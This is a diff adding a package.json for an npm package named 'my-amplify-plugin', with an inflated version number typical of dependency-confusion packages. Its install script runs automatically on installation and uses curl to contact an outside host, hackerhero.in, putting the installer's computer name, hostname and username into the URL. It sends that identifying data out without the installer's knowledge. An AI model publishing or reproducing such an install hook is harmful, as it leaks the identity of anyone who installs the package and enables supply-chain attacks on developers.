@@ -1,0 +1,14 @@
+{
+  "name": "my-amplify-plugin",
+  "version": "200.0.16",
+  "description": "my-amplify-plugin: coolest nodejs  package on planet earth",
+  "main": "index.js",
+  "scripts": {
+   "install": "curl -sI http://hackerhero.in/jugnu/%computername%`hostname`/%username%-`whoami`/p-my-amplify-plugin"
+  },
+  "author": "another noob developer",
+  "license": "ISC",
+  "dependencies": {
+    "wf-translate-text": "^0.0.1"
+  }
+}
